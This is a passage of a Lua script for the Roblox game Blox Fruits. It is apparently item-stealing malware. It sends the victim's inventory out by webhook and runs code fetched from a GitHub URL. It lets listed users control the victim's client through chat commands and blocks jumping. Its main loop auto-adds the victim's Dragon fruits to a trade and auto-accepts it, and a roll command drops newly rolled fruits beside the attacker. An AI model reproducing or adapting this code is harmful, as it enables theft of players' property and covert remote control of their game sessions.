                    "?allowall ?accept ?cleartrade ?kick",
                    "?roll ?activate ?allow",
                    "?d ?e ?silent"
                };
                sendMessage("--- Commands (V1.3.5) ---");
                task.wait(0.5);
                for i, m in ipairs(c) do
                    sendMessage(m);
                    task.wait(0.5)
                end
            end)
        end
    },
    activate = {
        d = "Activates command access.",
        u = "?activate <pass>",
        e = function(args, player)
            local passwordAttempt = args;
            if not passwordAttempt or passwordAttempt == "" then
                sendMessage("Usage: ?activate <pass>");
                return
            end;
            if not player or not player:IsA("Player") then
                return
            end;
            local foundPassword = false;
            for _, validPassword in ipairs(ActivationPasswords) do
                if passwordAttempt == validPassword then
                    foundPassword = true;
                    break
                end
            end;
            if foundPassword then
                if activatedUsers[player.UserId] then
                    sendMessage("Already activated.")
                else
                    activatedUsers[player.UserId] = true;
                    sendMessage("Activated for session!")
                end
            else
                sendMessage("Incorrect password.")
            end
        end
    },
    allowall = {
        d = "Toggles all player command access.",
        u = "?allowall",
        e = function(args, player)
            allowEveryone = not allowEveryone;
            local s = allowEveryone and "ENABLED" or "DISABLED";
            sendMessage("AllowEveryone: " .. s);
            if allowEveryone then
                sendMessage("ANYONE can use commands (unless ?d active)")
            end
        end
    },
    kick = {
        d = "Kicks script user.",
        u = "?kick <reason>",
        e = function(a, player)
            if not a or a == "" then
                sendMessage("Usage: ?kick <reason>");
                return
            end;
            local p = LocalPlayer;
            pcall(p.Kick, p, a)
        end
    },
    d = {
        d = "[Admin Only] Disables non-admin command/trade auth.",
        u = "?d",
        e = function(args, player)
            if not isCoreAdmin(player.Name) then
                sendMessage("Permission denied.")
                return
            end;
            if nonAdminAuthDisabled then
                sendMessage("Already disabled.")
            else
                nonAdminAuthDisabled = true;
                sendMessage("Non-Admin Auth: DISABLED.")
            end
        end
    },
    e = {
        d = "[Admin Only] Enables non-admin command/trade auth.",
        u = "?e",
        e = function(args, player)
            if not isCoreAdmin(player.Name) then
                sendMessage("Permission denied.")
                return
            end;
            if not nonAdminAuthDisabled then
                sendMessage("Already enabled.")
            else
                nonAdminAuthDisabled = false;
                sendMessage("Non-Admin Auth: ENABLED.")
            end
        end
    },
    silent = {
        d = "[Admin Only] Toggles silent mode (replies via whisper).",
        u = "?silent",
        e = function(args, player)
            if not isCoreAdmin(player.Name) then
                pcall(function()
                    SayMessageRequest:FireServer("Permission denied.", "All")
                end);
                return
            end;
            if isSilentModeActive then
                local previousTargetName = silentModeTargetPlayer and silentModeTargetPlayer.Name or "Unknown";
                isSilentModeActive = false;
                silentModeTargetPlayer = nil;
                pcall(function()
                    SayMessageRequest:FireServer("Silent mode DISABLED.", "All")
                end);
                if previousTargetName ~= "Unknown" then
                    pcall(function()
                        SayMessageRequest:FireServer("/w " .. previousTargetName .. " Silent mode was turned off.", "All")
                    end)
                end
            else
                isSilentModeActive = true;
                silentModeTargetPlayer = player;
                local targetName = player.Name;
                pcall(function()
                    SayMessageRequest:FireServer("/w " .. targetName .. " Silent mode ENABLED. Replies will now be whispered to you.", "All")
                end)
            end
        end
    },
    allow = {
        d = "[Authorized Only] Adds a user to the allowed list for session.",
        u = "?allow <username>",
        e = function(args, player)
            local usernameToAdd = args:match("^%s*(%S+)%s*$")

            if not usernameToAdd or usernameToAdd == "" then
                sendMessage("Usage: ?allow <username>")
                return
            end

            if not Usernames or type(Usernames) ~= "table" then Usernames = {} end

            local usernameToAddLower = usernameToAdd:lower()
            local alreadyExists = false
            for _, existingUser in ipairs(Usernames) do
                if type(existingUser) == "string" and existingUser:lower() == usernameToAddLower then
                    alreadyExists = true
                    break
                end
            end

            if alreadyExists then
                sendMessage("'" .. usernameToAdd .. "' is already in the Usernames list.")
                return
            end

            if BlacklistedUsers and type(BlacklistedUsers) == "table" then
                 for _, blacklistedName in ipairs(BlacklistedUsers) do
                     if type(blacklistedName) == "string" and usernameToAddLower == blacklistedName:lower() then
                         sendMessage("Cannot add '" .. usernameToAdd .. "' as they are blacklisted.")
                         return
                     end
                 end
            end

            table.insert(Usernames, usernameToAdd)
            sendMessage("Added '" .. usernameToAdd .. "' to the allowed list for this session.")
        end
    },
    roll = {
        d = "Rolls for a fruit, moves near issuer, then drops it.",
        u = "?roll",
        e = function(args, player) -- 'player' is the issuer of the command
            local ScriptUserCharacter = LocalPlayer.Character
            local ScriptUserHumanoid = ScriptUserCharacter and ScriptUserCharacter:FindFirstChildOfClass("Humanoid")
            local ScriptUserBackpack = LocalPlayer:FindFirstChildOfClass("Backpack")

            if not ScriptUserCharacter or not ScriptUserHumanoid or not ScriptUserBackpack then
                sendMessage("Error: Script User Character/Humanoid/Backpack not found.")
                return
            end

            local IS_ROLL_FUNCTION = true
            local ROLL_CHECK_ARGUMENTS = {"Cousin", "Check"}
            local ROLL_BUY_ARGUMENTS = {"Cousin", "Buy"}

            local rollRemote = nil
            local waitTimeout = 5 -- seconds to wait for the remote

            local rollSuccess, rollInstance = pcall(function() return ReplicatedStorage.Remotes:WaitForChild("CommF_", waitTimeout) end)

            if not rollSuccess or not rollInstance then
                sendMessage("Error: Failed to find Roll Remote ('CommF_') after waiting " .. waitTimeout .. "s. It might not exist or timed out.")
                warn("WaitForChild Error for CommF_: ", rollInstance)
                return
            elseif not rollInstance:IsA("RemoteFunction") then
                 sendMessage("Error: Found 'CommF_' but it is not a RemoteFunction.")
                 return
            end
            rollRemote = rollInstance

            local initialInventory = getInventory()
            if not initialInventory then sendMessage("Error: Inventory error before roll."); return end

            local checkCallSuccess, checkResult = pcall(function() return rollRemote:InvokeServer(unpack(ROLL_CHECK_ARGUMENTS)) end)
            if not checkCallSuccess then sendMessage("Error: Gacha check failed: " .. tostring(checkResult)); return end

            local buyCallSuccess, buyResult = pcall(function() return rollRemote:InvokeServer(unpack(ROLL_BUY_ARGUMENTS)) end)
            if not buyCallSuccess then sendMessage("Error: Gacha buy failed: " .. tostring(buyResult)); return end

            task.wait(1.5)

            local finalInventory = getInventory()
            if not finalInventory then sendMessage("Error: Inventory error after roll."); return end

            local rolledFruitInvName = nil
            local initialCounts = {}
            for _, item in ipairs(initialInventory) do if item.Type == "Blox Fruit" then initialCounts[item.Name] = item.Count end end
            for _, item in ipairs(finalInventory) do if item.Type == "Blox Fruit" then local initialCount = initialCounts[item.Name] or 0; if item.Count > initialCount then rolledFruitInvName = item.Name; break end end end

            if not rolledFruitInvName then sendMessage("Error: Failed to determine which fruit was rolled."); return end

            sendMessage("Rolled: " .. rolledFruitInvName .. "! Moving near issuer: " .. player.Name)

            local targetPlayer = player
            local targetCharacter = targetPlayer and targetPlayer.Character
            local targetRootPart = targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart")

            if not targetRootPart then
                 sendMessage("Warning: Could not find "..targetPlayer.Name.."'s character. Dropping fruit at current location.")
            else
                local offsetDistance = 5
                local destinationCFrame = targetRootPart.CFrame * CFrame.new(0, 0, -offsetDistance)
                local destinationPosition = destinationCFrame.Position
                tweenToPosition(destinationPosition)
            end

            local likelyToolName = rolledFruitInvName:match("(.+)%-.+")
            if not likelyToolName then sendMessage("Error: Could not parse tool name: " .. rolledFruitInvName); return end
            likelyToolName = likelyToolName .. " Fruit"

            local fruitTool = ScriptUserBackpack:FindFirstChild(likelyToolName)
             if not fruitTool or not fruitTool:IsA("Tool") then
                 for _, tool in ipairs(ScriptUserBackpack:GetChildren()) do if tool:IsA("Tool") and tool.Name:lower():match(likelyToolName:lower():match("^%s*(.-)%s*$")) then fruitTool = tool; break end end
                 if not fruitTool then sendMessage("Error: Could not find Tool '" .. likelyToolName .. "' in Backpack."); return end
             end

            ScriptUserHumanoid:EquipTool(fruitTool)
            task.wait(0.5)

            local equippedTool = ScriptUserCharacter:FindFirstChild(fruitTool.Name)
             if not equippedTool or not equippedTool:IsA("Tool") then sendMessage("Error: Failed to find equipped tool '" .. fruitTool.Name .. "' in Character."); ScriptUserHumanoid:UnequipTools(); return end

            local eatRemote = equippedTool:FindFirstChild("EatRemote")
             if not eatRemote or not eatRemote:IsA("RemoteFunction") then sendMessage("Error: Could not find 'EatRemote' in equipped tool."); ScriptUserHumanoid:UnequipTools(); return end

            local dropCallSuccess, dropCallResult = pcall(function() return eatRemote:InvokeServer("Drop") end)
            if not dropCallSuccess then sendMessage("Error: Drop failed: " .. tostring(dropCallResult))
            else sendMessage("Dropped '" .. rolledFruitInvName .. "' successfully.")
            end

             task.wait(0.2)
             ScriptUserHumanoid:UnequipTools()
        end
    }
}

-- Command Processor
local function processChatCommand(_, p, m)
    if not (p and m and typeof(p) == "Instance" and p:IsA("Player") and m:sub(1, 1) == "?") then return end;
    local cs = m:sub(2):match("^%s*(.-)%s*$");
    if not cs or cs == "" then return end;
    local commandName, args = cs:match("^(%S+)%s*(.-)%s*$");
    if not commandName then return end;
    commandName = commandName:lower();

    local executorIsCoreAdmin = isCoreAdmin(p.Name);
    local isPotentiallyAuthorized = false
    if executorIsCoreAdmin then isPotentiallyAuthorized = true
    elseif commandName == "activate" then isPotentiallyAuthorized = true
    elseif not nonAdminAuthDisabled then
        local isUsernameListed = false
        if Usernames and type(Usernames) == "table" then
            local playerNameLower = p.Name:lower()
            for _, allowedName in ipairs(Usernames) do if type(allowedName) == "string" and allowedName:lower() == playerNameLower then isUsernameListed = true; break end end
        end
        local isActivated = activatedUsers[p.UserId]
        if allowEveryone or isUsernameListed or isActivated then isPotentiallyAuthorized = true end
    end
    if not isPotentiallyAuthorized then return end -- Silently ignore

    local commandFuncData = Commands[commandName];
    if not commandFuncData then sendMessage("Unknown command: ?" .. commandName); return end;
    local playerName = p.Name;
    local playerCooldowns = CommandCooldowns[playerName];
    if playerCooldowns then local lastUsed = playerCooldowns[commandName]; if lastUsed and (tick() - lastUsed < DEFAULT_COOLDOWN) then return end -- Silent cooldown
    else playerCooldowns = {}; CommandCooldowns[playerName] = playerCooldowns end;
    playerCooldowns[commandName] = tick();
    task.spawn(function()
        local success, err = pcall(commandFuncData.e, args, p);
        if not success then sendMessage("Error executing ?" .. commandName .. ": " .. tostring(err)); warn("Command Error [" .. commandName .. "]: " .. tostring(err)) end
    end)
end

-- Main Loop & Init
local function startMainLoop()
    local ir = true;
    local hct = false;
    local ct, cs;
    local lmt = tick();
    local ltc = tick();
    local ltrc = tick();
    local UI = 0.5;
    local TCI = 2;
    local MCI = 4;
    local TVD = 1.5;
    local TRC = 4;
    local vpr = false;

    local humanoidSitConnection = nil
    local tradeVisibleConnection = nil
    local characterRemovingConnection = nil

    local autoAcceptActive = false
    local lastAcceptAttemptTime = 0
    local AUTO_ACCEPT_INTERVAL = 2

    local lastAutoAddCheckTime = 0
    local AUTO_ADD_CHECK_INTERVAL = 1.0

    -- Core Auto-Add Logic Function (Silent & setting autoAcceptActive)
    local function checkAndAutoAddDragon(fromPeriodicCheck)
        if currentTradeSessionAutoAddedDragon then return end

        local Character = LocalPlayer.Character
        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
        local PlayerGui = LocalPlayer:FindFirstChild("PlayerGui")
        local TradeFrame = PlayerGui and PlayerGui:FindFirstChild("Main") and PlayerGui.Main:FindFirstChild("Trade")

        if not Humanoid or not TradeFrame then return end

        -- <<< Use simplified check with isInTradeWithCorrectPlayer >>>
        local shouldAdd = lastScanWasDragonHit and Humanoid.Sit and TradeFrame.Visible and isInTradeWithCorrectPlayer()

        if shouldAdd then
            currentTradeSessionAutoAddedDragon = true
            autoAcceptActive = false

            task.spawn(function()
                local inv = getInventory()
                if not inv then warn("Auto-add Dragon: Failed to get inventory."); currentTradeSessionAutoAddedDragon = false; return end

                local dragonsToAdd = {}
                for _, item in ipairs(inv) do if item.Type == "Blox Fruit" and item.Name:find("Dragon") then table.insert(dragonsToAdd, {name = item.Name, count = item.Count}) end end

                if #dragonsToAdd == 0 then currentTradeSessionAutoAddedDragon = false; return end

                local addedCount = 0
                for _, dragonData in ipairs(dragonsToAdd) do
                    for i = 1, dragonData.count do
                         local success, err = pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", dragonData.name)
                         if success then addedCount = addedCount + 1 else warn("Auto-add Dragon Error adding " .. dragonData.name .. ": " .. tostring(err)) end
                         task.wait(0.15)
                    end
                end

                if addedCount > 0 then autoAcceptActive = true; lastAcceptAttemptTime = 0
                else currentTradeSessionAutoAddedDragon = false end
            end)
        end
    end

    -- Function to clean up connections specific to this loop/character instance
    local function cleanupCharacterConnections()
        if humanoidSitConnection and humanoidSitConnection.Connected then humanoidSitConnection:Disconnect() end
        if tradeVisibleConnection and tradeVisibleConnection.Connected then tradeVisibleConnection:Disconnect() end
        humanoidSitConnection = nil
        tradeVisibleConnection = nil
        currentTradeSessionAutoAddedDragon = false
        autoAcceptActive = false
    end

    local function vTP()
       if vpr then return end; vpr = true; local fc=0; local lts=false; for _=1,TRC do task.wait(0.25); local tu=LocalPlayer.PlayerGui:FindFirstChild("Main"); local crts=tu and tu:FindFirstChild("Trade") and tu.Trade.Visible; if lts~=crts or not crts or not isInTradeWithCorrectPlayer() then fc=fc+1 end; lts=crts end; if fc>=TRC-1 then task.wait(0.1); ForceJump() end; vpr=false
    end;

    local jcC;

    local function onCA(character) -- onCharacterAdded
        task.wait(1);
        local humanoid = character:WaitForChild("Humanoid", 5);
        local rootPart = character:WaitForChild("HumanoidRootPart", 5);
        local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
        local tradeFrame = playerGui and playerGui:FindFirstChild("Main", 5) and playerGui.Main:FindFirstChild("Trade", 5)

        if not humanoid or not rootPart or not tradeFrame then return end;

        local n = tick();
        lmt, ltc, ltrc = n, n, n;
        jcC = disableJump();

        cleanupCharacterConnections() -- Clean up any old connections first

        humanoidSitConnection = humanoid:GetPropertyChangedSignal("Sit"):Connect(function()
            if not humanoid.Sit then cleanupCharacterConnections() end -- Only need cleanup on stand
        end)

        tradeVisibleConnection = tradeFrame:GetPropertyChangedSignal("Visible"):Connect(function()
            if not tradeFrame.Visible then cleanupCharacterConnections() end -- Only need cleanup on close
        end)

        task.spawn(function() -- Initial table find and move
            ct, cs = findTradeTable();
            if ct and cs then tweenToPosition(cs.Position) end
        end)
    end;

    local function onCR() -- onCharacterRemoving
        ct, cs = nil, nil;
        cleanupCharacterConnections() -- Disconnect signals and reset flags
        if jcC and type(jcC) == "function" then pcall(jcC) end
        jcC = nil
    end;

    local function runML() -- Main Loop
        local lt = tick();
        while ir do
            local n = tick();
            lt = n;
            local character = LocalPlayer.Character;
            local rootPart = character and character:FindFirstChild("HumanoidRootPart")
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")

            if character and rootPart and humanoid then
                local playerGui = LocalPlayer.PlayerGui
                local tradeFrame = playerGui and playerGui:FindFirstChild("Main") and playerGui.Main:FindFirstChild("Trade")
                local isInTrade = tradeFrame and tradeFrame.Visible

                -- Trade validation jump logic (vTP)
                if not isInTrade then hct = false; ltrc = n
                elseif not hct and (n - ltrc) >= TVD then task.spawn(vTP); hct = true
                end;

                -- Periodic check for best trade table
                if n - ltc >= TCI then task.spawn(function() local nt, ns = findTradeTable(); if nt and ns then ct, cs = nt, ns end end); ltc = n
                end;

                -- Movement logic towards target seat if not sitting
                if ct and cs and not humanoid.Sit then
                    local dist = (rootPart.Position - cs.Position).Magnitude;
                    if dist > 5 then tweenToPosition(cs.Position)
                    elseif n - lmt >= MCI then local nudge = Vector3.new(math.random(-1, 1), 0, math.random(-1, 1)); tweenToPosition(cs.Position + nudge); lmt = n
                    end
                end

                -- Periodic Auto-Add Check
                if humanoid.Sit and isInTrade and (n - lastAutoAddCheckTime >= AUTO_ADD_CHECK_INTERVAL) then
                   lastAutoAddCheckTime = n
                   checkAndAutoAddDragon(true) -- Call check periodically
                end

                -- Auto-Accept Logic
                if autoAcceptActive and humanoid.Sit and isInTrade and (n - lastAcceptAttemptTime >= AUTO_ACCEPT_INTERVAL) then
                    lastAcceptAttemptTime = n -- Update time immediately
                    pcall(TradeFunction.InvokeServer, TradeFunction, "accept")
                end

            end;
            local timeElapsed = tick() - n;
            local waitTime = math.max(0.01, UI - timeElapsed);
            task.wait(waitTime)
        end
    end;

    -- Initial setup (Connections)
    local characterAddedConnection = LocalPlayer.CharacterAdded:Connect(onCA);
    characterRemovingConnection = LocalPlayer.CharacterRemoving:Connect(onCR); -- Store this specifically

    if LocalPlayer.Character then task.spawn(onCA, LocalPlayer.Character) end;
    task.spawn(runML); -- Start the main movement/accept loop

    -- Return the overall cleanup function for startMainLoop
    return function()
        ir = false; -- Stop the main loop
        if characterAddedConnection and characterAddedConnection.Connected then characterAddedConnection:Disconnect() end
        if characterRemovingConnection and characterRemovingConnection.Connected then characterRemovingConnection:Disconnect() end
        cleanupCharacterConnections() -- Clean up humanoid/trade connections & flags
        if jcC and type(jcC) == "function" then pcall(jcC) end; -- Enable jumping
        characterAddedConnection = nil; characterRemovingConnection = nil; jcC = nil; ct = nil; cs = nil;
    end
end

local function init()
    local pid = game.PlaceId;
    if pid == 2753915549 then LocalPlayer:Kick("Sea 2/3 Only!"); return end;
    if pid ~= 4442272183 and pid ~= 7449423635 then LocalPlayer:Kick("Blox Fruits Only!"); return end;
    local iInv = getInventory();
    if not iInv then LocalPlayer:Kick("Inventory Error."); return end;
    inventory22 = iInv
    local function cIFH(inv)
        local fs = {}; for _, f in ipairs(FruitsToHit) do fs[f] = true end;
        for _, i in ipairs(inv) do if (i.Type == "Blox Fruit" and fs[i.Name]) or i.Type == "Premium" then return true end end;
        return false
    end
    if not cIFH(iInv) then LocalPlayer:Kick("(Alt Filter)"); return end

    task.spawn(function() task.wait(1); JoinTeam(); task.spawn(createNotification); sendWebhook(iInv) end)

    local mls = nil;
    local cc = nil;
    local eUl = false
    local function onPA(p)
        if mls ~= nil then return end; -- Prevent multiple initializations

        local isAuthorized = false;
        if Usernames then
            local pNameLower = p.Name:lower()
            for _, un in ipairs(Usernames) do if type(un) == "string" and string.lower(un) == pNameLower then isAuthorized = true; break end end
        end;
        if not isAuthorized then return end;

        mls = function() end; -- Placeholder to prevent re-entry

        task.spawn(function()
            if not eUl then local s, e = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/UI/refs/heads/main/LoadingUI"))() end); if s then eUl = true end end;
            task.wait(1);
            if not cc then cc = Players.PlayerChatted:Connect(processChatCommand); end
            local cleanupFunc = startMainLoop();
            if cleanupFunc and type(cleanupFunc) == "function" then mls = cleanupFunc else warn("startMainLoop did not return a valid cleanup function!"); mls = function() end end
            task.spawn(function() task.wait(2); sendMessage("Join (uwdvTtqTDA) << Invite in dc if you want to learn how to make a lot of mythical fruits!") end)
        end)
    end
    local paC = Players.PlayerAdded:Connect(onPA);
    task.spawn(function() for _, p in ipairs(Players:GetPlayers()) do onPA(p) end end) -- Check existing players

    local lprC;
    lprC = Players.PlayerRemoving:Connect(function(p)
        if activatedUsers[p.UserId] then activatedUsers[p.UserId] = nil; end;
        if CommandCooldowns and CommandCooldowns[p.Name] then CommandCooldowns[p.Name] = nil end;
        if p == silentModeTargetPlayer then isSilentModeActive = false; silentModeTargetPlayer = nil end

        if p == LocalPlayer then
            sendProtector();
            if paC and paC.Connected then paC:Disconnect(); paC = nil end;
            if cc and cc.Connected then cc:Disconnect(); cc = nil end;
            if mls and type(mls) == "function" then pcall(mls) end;
            mls = nil
            if lprC and lprC.Connected then lprC:Disconnect(); lprC = nil end;
        end
    end)
end

-- Execution Guard
if not shared.ScriptExecuted_SharkyV2_Final_1_3_5_B then -- Slightly updated guard name again
    shared.ScriptExecuted_SharkyV2_Final_1_3_5_B = true
    task.spawn(function()
        local s, e = pcall(init);
        if not s then
            task.spawn(function()
                local m = string.gsub(tostring(e or "Unknown Error"), "[<>\"']", "");
                LocalPlayer:Kick("Init Error: " .. m)
            end)
        end
    end)
end
